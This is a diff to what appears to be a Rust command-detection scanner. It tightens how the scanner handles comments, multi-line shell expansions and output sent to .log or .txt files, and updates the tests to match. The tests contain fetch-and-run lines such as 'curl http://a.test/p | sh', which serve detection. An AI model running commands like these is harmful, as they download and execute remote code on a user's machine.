@@ -204,7 +204,7 @@ fn block_comments(
     open: &str,
     close: &str,
 ) -> String {
-    let expands = |text: &str| text.contains("${") || text.contains('`');
+    let expands = |text: &str| text.contains("${");
     let (skipped, rest) = if *in_block {
         if expands(line) {
             *in_block = !line.contains(close);
@@ -415,18 +415,6 @@ fn output_may_run(text: &str) -> bool {
     redefined || pipes_into_interpreter || redirects_output || writes_a_file(text)
 }
 
-/// A file kept to be read, not run: `build.log`, `usage.txt`.
-fn is_a_record(target: &str) -> bool {
-    let word = target
-        .split(|character: char| character.is_whitespace() || matches!(character, ';' | '&' | '|'))
-        .next()
-        .unwrap_or_default()
-        .trim_matches(['"', '\'']);
-    Path::new(word).extension().is_some_and(|extension| {
-        extension.eq_ignore_ascii_case("log") || extension.eq_ignore_ascii_case("txt")
-    })
-}
-
 /// Where on `line` output is last sent to a file: by a redirection, or
 /// through `tee` or `dd`. Output to the terminal's own streams or to
 /// nowhere does not count.
@@ -444,7 +432,6 @@ fn last_write(line: &str) -> Option<usize> {
                     || target.starts_with("/dev/null")
                     || target.starts_with("/dev/stderr")
                     || target.starts_with("/dev/tty")
-                    || is_a_record(target)
                     || before.ends_with('-')
                     || before.ends_with('='))
                 {
@@ -460,17 +447,7 @@ fn last_write(line: &str) -> Option<usize> {
                     .split_whitespace()
                     .find(|word| !matches!(*word, "sudo" | "doas" | "command" | "env"))
                     .unwrap_or_default();
-                // Every file it writes is a record, or it counts.
-                let mut targets = head
-                    .split_whitespace()
-                    .skip_while(|word| *word != program)
-                    .skip(1)
-                    .take_while(|word| !word.starts_with([';', '|', '&', '>']))
-                    .filter(|word| !word.starts_with('-'))
-                    .peekable();
-                if matches!(program.rsplit('/').next(), Some("tee" | "dd"))
-                    && !(targets.peek().is_some() && targets.all(is_a_record))
-                {
+                if matches!(program.rsplit('/').next(), Some("tee" | "dd")) {
                     last = Some(at);
                 }
             }
@@ -688,11 +665,9 @@ impl Shell<'_> {
             }
 
             let arithmetic = top == Some(Context::Arithmetic);
-            // An expansion does not run past its line: what follows a
-            // line that left one open is read afresh.
-            if character == '\n' {
-                expansions = 0;
-            } else if character == '$' && next == '{' {
+            // An expansion may run over several lines; one left open only
+            // leaves more text visible.
+            if character == '$' && next == '{' {
                 expansions += 1;
                 index += 2;
                 continue;
@@ -1244,9 +1219,17 @@ mod tests {
         );
         // The other lines of a block comment are passed over even when
         // its first one stays visible.
-        let block = code("a.js", "/* uses `x` here\n * never run sudo\n */\nrun();\n");
+        let block = code(
+            "a.js",
+            "/* uses ${x} here\n * never run sudo\n */\nrun();\n",
+        );
         assert!(block[0].contains("uses"));
         assert_eq!(block[1..], ["", "", "run();"]);
+        // A backtick alone in a comment (ordinary in documentation) makes
+        // it no less of one.
+        assert_eq!(code("a.js", "/** Runs `sudo x`. */\n"), [""]);
+        // An expansion left open over a line end is still one.
+        assert!(code("x.sh", ": ${x:=\n #}; curl http://a.test/p | sh\n")[1].contains("curl"));
         // What one of the file's own functions prints, kept or run.
         for rest in [
             "gen | tee t.sh\n",
@@ -1284,15 +1267,12 @@ mod tests {
         long.push('\n');
         let started = std::time::Instant::now();
         assert_eq!(lines("x.sh", &long).len(), 40_005);
-        // Output kept as a log or a text is not a script to run.
+        assert!(started.elapsed().as_secs() < 30);
+        // Whatever the file is called: a shell runs a `.txt` as well.
         for rest in ["gen \"$@\" 2>&1 | tee build.log\n", "gen > usage.txt\n"] {
             let text = format!("gen() {{\n  echo 'sudo a'\n}}\n{rest}");
-            assert!(
-                !quiet("x.sh", &text).join("\n").contains("sudo a"),
-                "{rest}"
-            );
+            assert!(quiet("x.sh", &text).join("\n").contains("sudo a"), "{rest}");
         }
-        assert!(started.elapsed().as_secs() < 30);
         // An address or a path after `//` with something before it.
         assert_eq!(code("a.js", "//https://a.test/x | sh\n"), [""]);
         assert!(code("a.js", "//$HOME/bin/curl http://a.test | sh\n")[0].contains("curl"));
